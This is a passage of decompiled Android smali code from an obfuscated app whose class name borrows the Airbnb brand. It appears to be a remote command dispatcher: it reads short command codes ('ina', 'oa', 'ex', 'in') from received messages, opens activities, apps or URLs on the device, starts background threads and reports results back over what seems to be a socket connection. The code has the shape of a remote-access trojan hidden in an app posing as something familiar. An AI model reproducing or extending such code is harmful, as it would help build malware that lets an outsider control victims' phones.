    .line 792
    invoke-virtual {v10, v4}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 793
    .line 794
    .line 795
    move-result-object v0

    .line 796
    const-string v3, "u"

    .line 797
    .line 798
    invoke-virtual {v10, v3}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 799
    .line 800
    .line 801
    move-result-object v3

    .line 802
    invoke-virtual {v10, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 803
    .line 804
    .line 805
    move-result-object v4

    .line 806
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    .line 807
    .line 808
    .line 809
    move-result v5

    .line 810
    const/16 v8, 0xcb3

    .line 811
    .line 812
    const v9, 0x10008000

    .line 813
    .line 814
    .line 815
    if-eq v5, v8, :cond_e

    .line 816
    .line 817
    const/16 v8, 0xdd2

    .line 818
    .line 819
    if-eq v5, v8, :cond_d

    .line 820
    .line 821
    const v6, 0x197dc

    .line 822
    .line 823
    .line 824
    if-eq v5, v6, :cond_c

    .line 825
    .line 826
    goto :goto_3

    .line 827
    :cond_c
    const-string v5, "ina"

    .line 828
    .line 829
    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 830
    .line 831
    .line 832
    move-result v5

    .line 833
    if-eqz v5, :cond_f

    .line 834
    .line 835
    new-instance v5, Landroid/content/Intent;

    .line 836
    .line 837
    invoke-virtual {v7}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 838
    .line 839
    .line 840
    move-result-object v6

    .line 841
    const-class v8, Lcgn/cdfbgd/sa;

    .line 842
    .line 843
    invoke-direct {v5, v6, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 844
    .line 845
    .line 846
    invoke-virtual {v5, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 847
    .line 848
    .line 849
    invoke-virtual {v5, v13, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 850
    .line 851
    .line 852
    invoke-virtual {v7, v5}, Lcgn/cdfbgd/a;->a(Landroid/content/Intent;)V

    .line 853
    .line 854
    .line 855
    goto :goto_3

    .line 856
    :cond_d
    const-string v3, "oa"

    .line 857
    .line 858
    invoke-virtual {v4, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 859
    .line 860
    .line 861
    move-result v3

    .line 862
    if-eqz v3, :cond_f

    .line 863
    .line 864
    invoke-virtual {v7}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 865
    .line 866
    .line 867
    move-result-object v3

    .line 868
    invoke-static {v3, v0}, La0/n;->w(Landroid/content/Context;Ljava/lang/String;)Landroid/content/Intent;

    .line 869
    .line 870
    .line 871
    move-result-object v3

    .line 872
    invoke-virtual {v3, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 873
    .line 874
    .line 875
    invoke-virtual {v7, v3}, Lcgn/cdfbgd/a;->a(Landroid/content/Intent;)V

    .line 876
    .line 877
    .line 878
    goto :goto_3

    .line 879
    :cond_e
    const-string v5, "ex"

    .line 880
    .line 881
    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 882
    .line 883
    .line 884
    move-result v5

    .line 885
    if-eqz v5, :cond_f

    .line 886
    .line 887
    new-instance v5, Landroid/content/Intent;

    .line 888
    .line 889
    const-string v6, "android.intent.action.VIEW"

    .line 890
    .line 891
    invoke-direct {v5, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 892
    .line 893
    .line 894
    invoke-virtual {v5, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 895
    .line 896
    .line 897
    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 898
    .line 899
    .line 900
    move-result-object v3

    .line 901
    invoke-virtual {v5, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 902
    .line 903
    .line 904
    invoke-virtual {v7, v5}, Lcgn/cdfbgd/a;->a(Landroid/content/Intent;)V
    :try_end_9
    .catch Le2/b; {:try_start_9 .. :try_end_9} :catch_3

    .line 905
    .line 906
    .line 907
    :cond_f
    :goto_3
    :try_start_a
    new-instance v3, Le2/c;

    .line 908
    .line 909
    invoke-direct {v3}, Le2/c;-><init>()V

    .line 910
    .line 911
    .line 912
    move-object/from16 v5, v17

    .line 913
    .line 914
    invoke-virtual {v3, v5, v2}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 915
    .line 916
    .line 917
    const-string v2, "d"

    .line 918
    .line 919
    new-instance v5, Ljava/lang/StringBuilder;

    .line 920
    .line 921
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 922
    .line 923
    .line 924
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 925
    .line 926
    .line 927
    const-string v0, " "

    .line 928
    .line 929
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 930
    .line 931
    .line 932
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 933
    .line 934
    .line 935
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 936
    .line 937
    .line 938
    move-result-object v0

    .line 939
    invoke-virtual {v3, v2, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 940
    .line 941
    .line 942
    sget-object v0, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 943
    .line 944
    invoke-virtual {v3, v1, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 945
    .line 946
    .line 947
    sget-object v0, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 948
    .line 949
    const-string v1, "cwq"

    .line 950
    .line 951
    invoke-virtual {v3}, Le2/c;->toString()Ljava/lang/String;

    .line 952
    .line 953
    .line 954
    move-result-object v2

    .line 955
    filled-new-array {v2}, [Ljava/lang/Object;

    .line 956
    .line 957
    .line 958
    move-result-object v2

    .line 959
    invoke-virtual {v0, v1, v2}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    .line 960
    .line 961
    .line 962
    goto/16 :goto_2

    .line 963
    .line 964
    :catch_5
    move-exception v0

    .line 965
    :try_start_b
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 966
    .line 967
    .line 968
    goto/16 :goto_2

    .line 969
    .line 970
    :cond_10
    const-string v2, "in"

    .line 971
    .line 972
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 973
    .line 974
    .line 975
    move-result v0

    .line 976
    if-eqz v0, :cond_6

    .line 977
    .line 978
    invoke-virtual {v10, v8}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 979
    .line 980
    .line 981
    move-result-object v0

    .line 982
    invoke-virtual {v10, v13}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 983
    .line 984
    .line 985
    move-result-object v2

    .line 986
    invoke-virtual {v9, v0}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 987
    .line 988
    .line 989
    new-instance v3, Ljava/lang/Thread;

    .line 990
    .line 991
    new-instance v4, Landroidx/emoji2/text/m;
    :try_end_b
    .catch Le2/b; {:try_start_b .. :try_end_b} :catch_3

    .line 992
    .line 993
    const/4 v6, 0x1

    .line 994
    move-object/from16 v5, p0

    .line 995
    .line 996
    :try_start_c
    invoke-direct {v4, v5, v2, v0, v6}, Landroidx/emoji2/text/m;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 997
    .line 998
    .line 999
    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 1000
    .line 1001
    .line 1002
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
    :try_end_c
    .catch Le2/b; {:try_start_c .. :try_end_c} :catch_7

    .line 1003
    .line 1004
    .line 1005
    :try_start_d
    new-instance v0, Le2/c;

    .line 1006
    .line 1007
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 1008
    .line 1009
    .line 1010
    sget-object v2, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 1011
    .line 1012
    invoke-virtual {v0, v1, v2}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 1013
    .line 1014
    .line 1015
    new-instance v1, Le2/a;

    .line 1016
    .line 1017
    invoke-direct {v1, v9}, Le2/a;-><init>(Ljava/util/Collection;)V

    .line 1018
    .line 1019
    .line 1020
    invoke-virtual {v0, v15, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 1021
    .line 1022
    .line 1023
    sget-object v1, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 1024
    .line 1025
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 1026
    .line 1027
    .line 1028
    move-result-object v0

    .line 1029
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 1030
    .line 1031
    .line 1032
    move-result-object v0

    .line 1033
    invoke-virtual {v1, v14, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    .line 1034
    .line 1035
    .line 1036
    goto :goto_5

    .line 1037
    :catch_6
    move-exception v0

    .line 1038
    :try_start_e
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_e
    .catch Le2/b; {:try_start_e .. :try_end_e} :catch_7

    .line 1039
    .line 1040
    .line 1041
    goto :goto_5

    .line 1042
    :catch_7
    move-exception v0

    .line 1043
    goto :goto_4

    .line 1044
    :catch_8
    move-exception v0

    .line 1045
    move-object v5, v1

    .line 1046
    :goto_4
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 1047
    .line 1048
    .line 1049
    goto :goto_5

    .line 1050
    :cond_11
    move-object v5, v1

    .line 1051
    :goto_5
    return-void

    .line 1052
    :pswitch_1
    move-object v5, v1

    .line 1053
    check-cast v7, Lf/c0;

    .line 1054
    .line 1055
    invoke-virtual {v7}, Lf/c0;->g()V

    .line 1056
    .line 1057
    .line 1058
    return-void

    .line 1059
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch

    .line 1060
    .line 1061
    .line 1062
    .line 1063
    .line 1064
    .line 1065
    .line 1066
    .line 1067
    :sswitch_data_0
    .sparse-switch
        0x76 -> :sswitch_f
        0xc5e -> :sswitch_e
        0x179a8 -> :sswitch_d
        0x1812a -> :sswitch_c
        0x18222 -> :sswitch_b
        0x18ecf -> :sswitch_a
        0x190fd -> :sswitch_9
        0x196aa -> :sswitch_8
        0x1b97b -> :sswitch_7
        0x1ba42 -> :sswitch_6
        0x1bc11 -> :sswitch_5
        0x1bd59 -> :sswitch_4
        0x1becd -> :sswitch_3
        0x360406 -> :sswitch_2
        0x6424f30 -> :sswitch_1
        0x68a7d1d -> :sswitch_0
    .end sparse-switch
.end method
